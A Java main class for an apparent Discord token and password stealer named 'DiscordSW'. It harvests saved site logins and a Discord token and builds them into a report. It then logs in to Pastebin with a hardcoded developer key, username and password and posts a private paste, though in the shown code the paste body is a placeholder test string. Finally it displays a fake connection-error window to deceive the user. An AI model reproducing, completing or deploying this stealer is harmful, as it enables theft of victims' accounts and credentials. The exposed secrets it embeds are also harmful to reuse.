package me.mafrans.discordsw;

import me.mafrans.discordsw.stealer.Data;
import me.mafrans.discordsw.stealer.Stealer;
import org.jpaste.pastebin.Pastebin;
import org.jpaste.pastebin.PastebinLink;
import org.jpaste.pastebin.PastebinPaste;

import java.io.*;
import java.util.List;

public class Main {
    public static void main(String[] b) {
        try {
            List<Data> dataList = Stealer.steal();

            StringBuilder builder = new StringBuilder();
            builder.append("Token: " + Discord.getToken() + "\n\n\n");
            for(Data data : dataList) {
                builder.append(data.siteURL + ":\n");
                builder.append("Username: " + data.username + "\n");
                builder.append("Password: " + data.password + "\n\n");
            }

            String devKey = "bf087793e4e2e36555dcfc1c212d192a";

            PastebinManager.authenticateUser(devKey, "Nafrans", "SMrxwN3CdKpH");
            PastebinLink link = PastebinManager.postPrivate("DiscordSW output", "this is a test post");
            System.out.println("Output pasted into " + link.getLink().toString());
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        ErrorWindow.run("Error when establishing connection, code:0003");
    }
}
